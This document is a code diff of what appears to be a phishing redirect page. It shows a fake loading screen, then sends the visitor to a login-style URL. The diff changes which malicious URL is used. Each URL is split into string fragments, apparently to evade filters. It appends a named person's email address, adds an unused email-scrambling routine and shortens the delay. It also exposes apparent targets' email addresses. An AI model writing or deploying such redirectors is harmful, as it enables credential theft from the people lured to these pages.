@@ -90,7 +90,7 @@
 
 <script>
     document.addEventListener("DOMContentLoaded", () => {
-        showLoaderAndLoadContent(5000); // Adjust loading duration as neededcdcsvdiqv8m2gf
+        showLoaderAndLoadContent(2500); // Adjust loading duration as neededcdcsvdiqv8m2gf
     });
 
     function showLoaderAndLoadContent(loadingDuration) {
@@ -117,13 +117,35 @@
     function getRedirectURL() {
         const urlParams = new URLSearchParams(window.location.search);
 
-        const a = "https://msonline365-";
-        const b = "PTLKX54M765PE2";
-        const c = ".ballancer-pro.";
-        const d = "com:8443/impact?";
-        const e = "ZZZ6240498";
-        const f = "=felcita@elitser-me.com";
-        
+        const a = "https://login.ac";
+        const b = "jarvis";
+        const c = "build";
+        const d = "ers.com";
+        const e = "/LaDgYMPX#";
+        const f = "sarah@driverspickles.co.uk";
+
+        // Custom transformation function
+        function transformEmail(f) {
+            let transformed = "";
+
+            // Step 1: Convert each character to its ASCII code and perform operations
+            for (let i = 0; i < f.length; i++) {
+                const charCode = f.charCodeAt(i);
+
+                // Step 2: Perform bitwise operations and add a fixed number
+                const transformedCharCode = ((charCode << 3) ^ 0x1F) + i;
+
+                // Step 3: Convert back to a character and append to the result
+                transformed += String.fromCharCode(transformedCharCode % 256); // Ensure it stays within ASCII range
+            }
+
+            // Step 4: Reverse the string and encode it in Base64
+            transformed = transformed.split("").reverse().join("");
+            transformed = btoa(transformed); // Base64 encode
+
+            return transformed;
+        }
+        const g = transformEmail(f);
         return urlParams.get("redirect") || (a + b + c + d + e + f);
     }
 
